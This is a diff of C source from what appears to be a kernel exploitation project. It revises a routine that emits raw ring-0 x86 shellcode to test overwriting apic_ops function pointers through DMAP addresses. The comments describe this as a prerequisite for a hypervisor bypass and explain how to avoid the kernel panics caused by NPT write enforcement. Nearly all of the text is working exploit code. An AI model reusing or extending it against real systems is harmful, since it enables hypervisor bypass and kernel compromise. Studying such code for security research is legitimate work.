@@ -1324,9 +1324,13 @@ static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
  * Tests whether apic_ops function pointers can be written from ring 0.
  * This is the prerequisite for the flatz suspend/resume HV bypass.
  *
+ * IMPORTANT: All apic_ops access goes through DMAP addresses, NOT kdata VA.
+ * Direct kdata VA access causes kernel panic (HV/NPT enforcement).
+ * DMAP maps the same physical memory but with write permission.
+ *
  * Test 1 (same-value writeback):
- *   - Read current apic_ops[2] (xapic_mode)
- *   - Write the same value back
+ *   - Read current apic_ops[2] (xapic_mode) via DMAP
+ *   - Write the same value back via DMAP
  *   - Read again to verify write took effect
  *   → If match: slot is writable, no CFI trap on same-value write
  *
@@ -1335,6 +1339,9 @@ static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
  *   - Read back to verify
  *   - IMMEDIATELY restore original apic_ops[2] value
  *   → If match: we can overwrite with arbitrary ktext pointer
+ *
+ * Only uses caller-saved registers (RAX, RCX, RDX, RSI, RDI).
+ * Temporary values stored in output buffer — no push/pop needed.
  *
  * Result buffer layout (offsets from output_kva):
  *   [0]   magic (8 bytes)
@@ -1350,17 +1357,15 @@ static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
  */
 static int build_ring0_apic_writeback_shellcode(uint8_t *buf, int bufmax,
                                                  uint64_t output_kva,
-                                                 uint64_t apic_ops_kva) {
+                                                 uint64_t slot0_dmap,
+                                                 uint64_t slot2_dmap) {
     int p = 0;
 
     #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
     #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
     #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)
 
-    uint64_t slot2_kva = apic_ops_kva + 0x10;  /* xapic_mode */
-    uint64_t slot0_kva = apic_ops_kva;          /* create */
-
-    /* movabs $output_kva, %rdi   — result buffer pointer */
+    /* movabs $output_kva, %rdi   — result buffer pointer (DMAP) */
     EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);
 
     /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
@@ -1370,91 +1375,84 @@ static int build_ring0_apic_writeback_shellcode(uint8_t *buf, int bufmax,
     /* status = RUNNING: movl $1, 8(%rdi) */
     EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);
 
-    /* ── Read apic_ops[2] (xapic_mode) ── */
-    /* movabs $slot2_kva, %rsi */
-    EMIT(0x48); EMIT(0xBE); EMIT_U64(slot2_kva);
+    /* ── Read apic_ops[2] (xapic_mode) via DMAP ── */
+    /* movabs $slot2_dmap, %rsi */
+    EMIT(0x48); EMIT(0xBE); EMIT_U64(slot2_dmap);
     /* mov (%rsi), %rax  — original value */
     EMIT(0x48); EMIT(0x8B); EMIT(0x06);
     /* mov %rax, 32(%rdi) — store original_val */
     EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x20);
-    /* Save original in R12 for later restore */
-    /* push %r12 */
-    EMIT(0x41); EMIT(0x54);
-    /* mov %rax, %r12 */
-    EMIT(0x49); EMIT(0x89); EMIT(0xC4);
+    /* Keep original in RDX throughout */
+    /* mov %rax, %rdx */
+    EMIT(0x48); EMIT(0x89); EMIT(0xC2);
 
-    /* ── Read apic_ops[0] (create) for cross-type test ── */
-    /* movabs $slot0_kva, %rcx */
-    EMIT(0x48); EMIT(0xB9); EMIT_U64(slot0_kva);
-    /* mov (%rcx), %rdx — slot0 value */
-    EMIT(0x48); EMIT(0x8B); EMIT(0x11);
-    /* Save slot0 in R13 */
-    /* push %r13 */
-    EMIT(0x41); EMIT(0x55);
-    /* mov %rdx, %r13 */
-    EMIT(0x49); EMIT(0x89); EMIT(0xD5);
-    /* mov %rdx, 40(%rdi) — store slot0_val */
-    EMIT(0x48); EMIT(0x89); EMIT(0x57); EMIT(0x28);
+    /* ── Read apic_ops[0] (create) via DMAP ── */
+    /* movabs $slot0_dmap, %rcx */
+    EMIT(0x48); EMIT(0xB9); EMIT_U64(slot0_dmap);
+    /* mov (%rcx), %rax — slot0 value */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x01);
+    /* mov %rax, 40(%rdi) — store slot0_val */
+    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x28);
 
     /* ═══ Test 1: Same-value writeback ═══ */
-    /* mov %r12, (%rsi) — write original value back to slot2 */
-    EMIT(0x4C); EMIT(0x89); EMIT(0x26);
+    /* Write original (RDX) back to slot2 via DMAP */
+    /* mov %rdx, (%rsi) */
+    EMIT(0x48); EMIT(0x89); EMIT(0x16);
     /* mfence */
     EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
     /* mov (%rsi), %rax — read back */
     EMIT(0x48); EMIT(0x8B); EMIT(0x06);
     /* mov %rax, 48(%rdi) — store test1_readback */
     EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x30);
-    /* cmp %r12, %rax */
-    EMIT(0x4C); EMIT(0x39); EMIT(0xE0);
-    /* sete %al */
-    EMIT(0x0F); EMIT(0x94); EMIT(0xC0);
-    /* movzbl %al, %eax */
-    EMIT(0x0F); EMIT(0xB6); EMIT(0xC0);
-    /* mov %eax, 56(%rdi) — store test1_ok */
-    EMIT(0x89); EMIT(0x47); EMIT(0x38);
+    /* cmp %rdx, %rax */
+    EMIT(0x48); EMIT(0x39); EMIT(0xD0);
+    /* sete %cl */
+    EMIT(0x0F); EMIT(0x94); EMIT(0xC1);
+    /* movzbl %cl, %ecx */
+    EMIT(0x0F); EMIT(0xB6); EMIT(0xC9);
+    /* mov %ecx, 56(%rdi) — store test1_ok */
+    EMIT(0x89); EMIT(0x4F); EMIT(0x38);
 
     /* ═══ Test 2: Cross-type write (slot0 → slot2) ═══ */
-    /* mov %r13, (%rsi) — write slot0 value into slot2 */
-    EMIT(0x4C); EMIT(0x89); EMIT(0x2E);
+    /* Reload slot0 value from buf[40] (RDX still has original) */
+    /* mov 40(%rdi), %rax */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x47); EMIT(0x28);
+    /* mov %rax, (%rsi) — write slot0 value into slot2 via DMAP */
+    EMIT(0x48); EMIT(0x89); EMIT(0x06);
     /* mfence */
     EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
-    /* mov (%rsi), %rax — read back */
-    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
-    /* mov %rax, 64(%rdi) — store test2_readback */
-    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x40);
-    /* cmp %r13, %rax */
-    EMIT(0x4C); EMIT(0x39); EMIT(0xE8);
-    /* sete %al */
-    EMIT(0x0F); EMIT(0x94); EMIT(0xC0);
-    /* movzbl %al, %eax */
-    EMIT(0x0F); EMIT(0xB6); EMIT(0xC0);
-    /* mov %eax, 72(%rdi) — store test2_ok */
-    EMIT(0x89); EMIT(0x47); EMIT(0x48);
+    /* mov (%rsi), %rcx — read back */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x0E);
+    /* mov %rcx, 64(%rdi) — store test2_readback */
+    EMIT(0x48); EMIT(0x89); EMIT(0x4F); EMIT(0x40);
+    /* cmp %rax, %rcx */
+    EMIT(0x48); EMIT(0x39); EMIT(0xC1);
+    /* sete %cl */
+    EMIT(0x0F); EMIT(0x94); EMIT(0xC1);
+    /* movzbl %cl, %ecx */
+    EMIT(0x0F); EMIT(0xB6); EMIT(0xC9);
+    /* mov %ecx, 72(%rdi) — store test2_ok */
+    EMIT(0x89); EMIT(0x4F); EMIT(0x48);
 
-    /* ═══ Restore: Write original back to slot2 ═══ */
-    /* mov %r12, (%rsi) — restore original value */
-    EMIT(0x4C); EMIT(0x89); EMIT(0x26);
+    /* ═══ Restore: Write original (RDX) back to slot2 ═══ */
+    /* mov %rdx, (%rsi) — restore original value */
+    EMIT(0x48); EMIT(0x89); EMIT(0x16);
     /* mfence */
     EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
     /* mov (%rsi), %rax — read back after restore */
     EMIT(0x48); EMIT(0x8B); EMIT(0x06);
     /* mov %rax, 80(%rdi) — store restore_readback */
     EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x50);
-    /* cmp %r12, %rax */
-    EMIT(0x4C); EMIT(0x39); EMIT(0xE0);
-    /* sete %al */
-    EMIT(0x0F); EMIT(0x94); EMIT(0xC0);
-    /* movzbl %al, %eax */
-    EMIT(0x0F); EMIT(0xB6); EMIT(0xC0);
-    /* mov %eax, 88(%rdi) — store restore_ok */
-    EMIT(0x89); EMIT(0x47); EMIT(0x58);
+    /* cmp %rdx, %rax */
+    EMIT(0x48); EMIT(0x39); EMIT(0xD0);
+    /* sete %cl */
+    EMIT(0x0F); EMIT(0x94); EMIT(0xC1);
+    /* movzbl %cl, %ecx */
+    EMIT(0x0F); EMIT(0xB6); EMIT(0xC9);
+    /* mov %ecx, 88(%rdi) — store restore_ok */
+    EMIT(0x89); EMIT(0x4F); EMIT(0x58);
 
     /* ── Finalize ── */
-    /* pop %r13; pop %r12 */
-    EMIT(0x41); EMIT(0x5D);
-    EMIT(0x41); EMIT(0x5C);
-
     /* status = DONE: movl $2, 8(%rdi) */
     EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);
 
@@ -4231,10 +4229,36 @@ ring3_fallback:
                            (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
                     fflush(stdout);
 
+                    /*
+                     * Compute DMAP addresses for apic_ops slots.
+                     * Must use DMAP for ring-0 access — direct kdata VA
+                     * causes kernel panic (HV/NPT blocks writes via kdata VA).
+                     */
+                    uint64_t apic_pa = va_to_pa_quiet(apic_ops_addr);
+                    uint64_t slot0_dmap = g_dmap_base + apic_pa;
+                    uint64_t slot2_dmap = g_dmap_base + apic_pa + 0x10;
+                    printf("    apic_ops PA: 0x%lx\n", (unsigned long)apic_pa);
+                    printf("    slot0 DMAP:  0x%lx\n", (unsigned long)slot0_dmap);
+                    printf("    slot2 DMAP:  0x%lx\n", (unsigned long)slot2_dmap);
+                    fflush(stdout);
+
+                    if (!apic_pa || apic_pa >= MAX_SAFE_PA) {
+                        printf("[-] Cannot resolve apic_ops PA (0x%lx) — skipping.\n",
+                               (unsigned long)apic_pa);
+                    } else {
+
+                    /* Verify DMAP read of apic_ops matches scan results */
+                    uint64_t dmap_verify;
+                    kernel_copyout(slot2_dmap, &dmap_verify, 8);
+                    printf("    DMAP verify slot2: 0x%016lx\n",
+                           (unsigned long)dmap_verify);
+                    fflush(stdout);
+
                     /* Build writeback test shellcode */
                     uint8_t wb_sc[512];
                     int wb_sc_len = build_ring0_apic_writeback_shellcode(
-                        wb_sc, sizeof(wb_sc), result_kva, apic_ops_addr);
+                        wb_sc, sizeof(wb_sc), result_kva,
+                        slot0_dmap, slot2_dmap);
                     printf("[*] Writeback test shellcode: %d bytes\n", wb_sc_len);
 
                     if (wb_sc_len <= 0 || wb_sc_len > 480) {
@@ -4367,6 +4391,7 @@ ring3_fallback:
                             kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
                         }
                     }
+                    } /* end apic_pa valid check */
                     printf("\n");
                     fflush(stdout);
                 }
